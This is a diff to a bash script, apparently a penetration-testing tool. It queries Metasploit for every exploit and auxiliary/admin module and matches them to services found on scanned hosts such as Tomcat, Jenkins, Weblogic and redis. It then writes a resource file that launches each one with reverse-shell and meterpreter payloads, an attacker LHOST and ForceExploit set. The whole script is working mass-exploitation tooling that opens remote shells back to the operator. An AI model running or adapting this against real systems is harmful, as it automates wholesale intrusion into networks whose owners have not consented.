@@ -1,5 +1,5 @@
 #!/bin/bash 
-# 20210508 kirby
+# 20210523 kirby
 
 
 if [[ ! -f "$1" ]]
@@ -32,7 +32,6 @@ function echocmd()
         cmd/unix/reverse_perl \
         cmd/unix/reverse_python \
         cmd/unix/reverse_ruby \
-        cmd/windows/generic \
         cmd/windows/reverse_powershell \
         generic/shell_reverse_tcp \
         java/meterpreter/reverse_tcp \
@@ -51,9 +50,6 @@ function echocmd()
         ruby/pingback_bind_tcp \
         ruby/pingback_reverse_tcp \
         ruby/shell_reverse_tcp \
-        windows/dllinject/reverse_tcp \
-        windows/dllinject/reverse_tcp_dns \
-        windows/encrypted_shell/reverse_tcp \
         windows/meterpreter/reverse_tcp \
         windows/peinject/reverse_tcp \
         windows/peinject/reverse_tcp_dns \
@@ -72,11 +68,11 @@ function echocmd()
         windows/x64/shell_reverse_tcp \
         windows/x64/shell/reverse_tcp_uuid
     do
-        if [[ $exploit =~ 'windows' ]] && [[ ! $payload =~ 'windows' ]]
+        if [[ $module =~ 'windows' ]] && [[ ! $payload =~ 'windows' ]]
         then
             continue
         fi
-        if [[ $exploit =~ 'linux' ]] && [[ $payload =~ 'windows' ]]
+        if [[ $module =~ 'linux' ]] && [[ $payload =~ 'windows' ]]
         then
             continue
         fi
@@ -101,10 +97,17 @@ function echocmd()
             let srvport++
         done
 
+        if [[ $SSL == "false" ]]
+        then
+            TARGETURI="http://$host:$port"
+        elif [[ $SSL == "true" ]]
+        then
+            TARGETURI="https://$host:$port"
+        fi
 
         echo "echo \"$BORDER\"" >> "$cmdfile"
         echo "echo 'TESTING $host:$port'" >> "$cmdfile"
-        echo "use $exploit" >> "$cmdfile"
+        echo "use $module" >> "$cmdfile"
         echo "set PAYLOAD $payload" >> "$cmdfile"
         echo "set RPORT $port" >> "$cmdfile"
         echo "set RHOSTS $host" >> "$cmdfile"
@@ -114,9 +117,12 @@ function echocmd()
         echo "set LHOST $myip" >> "$cmdfile"
         echo "set SRVPORT $srvport" >> "$cmdfile"
         echo "set SRVHOST $myip" >> "$cmdfile"
+        echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
         echo "set SSL $SSL" >> "$cmdfile"
+        echo "set TARGETURI $TARGETURI" >> "$cmdfile"
+        echo "set ForceExploit True" >> "$cmdfile"
         echo "exploit -j" >> "$cmdfile"
-        echo "sleep .5" >> "$cmdfile"
+        echo "sleep .2" >> "$cmdfile"
     done
 
     echo "jobs" >> "$cmdfile"
@@ -125,14 +131,24 @@ function echocmd()
 }
 
 
-for exploit in $(/usr/share/metasploit-framework/msfconsole \
+for module in $(/usr/share/metasploit-framework/msfconsole \
     -q -n -x 'search exploit/; exit -y' \
+    |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
     |grep -v trans2open \
     |awk '{print $2}' \
-    |egrep -i "exploit/" \
-    |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g")
+    |egrep -i "exploit/" )
 do
-    EXPLOITS[${#EXPLOITS[@]}]=$exploit
+    EXPLOITS[${#EXPLOITS[@]}]=$module
+done
+
+for module in $(/usr/share/metasploit-framework/msfconsole \
+    -q -n -x 'search auxiliary/admin; exit -y' \
+    |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
+    |grep -v trans2open \
+    |awk '{print $2}' \
+    |egrep -i "auxiliary/admin" )
+do
+    AUXILADMIN[${#AUXILADMIN[@]}]=$module
 done
 
 
@@ -182,31 +198,58 @@ do
 
             for scanthis in \
                 Apache \
+                axis \
+                bmc \
+                cassandra \
+                cisco \
+                citrix \
+                coldfusion \
                 Consul \
                 docker \
+                elastic \
                 ftp \
                 git \
                 JBoss \
                 jdwp \
                 Jenkins \
+                jetty \
                 Jira \
+                juniper \
+                mongo \
+                mq \
                 MySQL \
+                nagios \
+                nrpe \
                 PHP \
                 Postgres \
                 redis \
                 Samba \
                 Solr \
+                smb \
                 smtp \
+                squid \
+                teamcity \
                 Tomcat \
-                Weblogic
+                veritas \
+                Weblogic \
+                zabbix \
+                zookeeper
             do
                 if [[ $version =~ "$scanthis" ]] \
                 || [[ $service =~ "$scanthis" ]]
                 then
                     echo "Found $scanthis on $host:$port"
-                    for exploit in ${EXPLOITS[@]}
+                    for module in ${EXPLOITS[@]}
                     do
-                        if [[ $exploit =~ "$scanthis" ]]
+                        if [[ $module =~ "$scanthis" ]]
+                        then 
+                            echocmd
+                        fi
+                    done
+                    echo "Found $scanthis on $host:$port"
+                    for module in ${AUXILADMIN[@]}
+                    do
+                        if [[ $module =~ "$scanthis" ]]
                         then 
                             echocmd
                         fi
@@ -218,10 +261,10 @@ do
             || [[ $version =~ 'RMI' ]] \
             || [[ $version =~ 'JMX' ]]
             then
-    	        for exploit in \
+                for module in \
                     exploit/multi/misc/java_jmx_server \
-    	            exploit/multi/misc/java_rmi_server
-		        do
+                    exploit/multi/misc/java_rmi_server
+                do
                     echocmd
                 done
             fi
@@ -231,16 +274,22 @@ do
             continue
 
 
-            if [[ $service == 'http' ]] \
-            || [[ $service == 'ssl|https' ]]
+            if [[ $service =~ 'http' ]]
             then
                 echo "Found $service on $host:$port"
-                for exploit in ${EXPLOITS[@]}
+                for module in ${EXPLOITS[@]}
                 do
-                    if [[ $exploit =~ "exploit/multi/http" ]] \
-                    || [[ $exploit =~ "exploit/linux/http" ]] \
-                    || [[ $exploit =~ "exploit/unix/http" ]] \
-                    || [[ $exploit =~ "exploit/unix/webapp" ]] 
+                    if [[ $module =~ "exploit/multi/http" ]] \
+                    || [[ $module =~ "exploit/linux/http" ]] \
+                    || [[ $module =~ "exploit/unix/http" ]] \
+                    || [[ $module =~ "exploit/unix/webapp" ]] 
+                    then 
+                        echocmd
+                    fi
+                done
+                for module in ${AUXILADMIN[@]}
+                do
+                    if [[ $module =~ "auxiliary/admin/http" ]]
                     then 
                         echocmd
                     fi
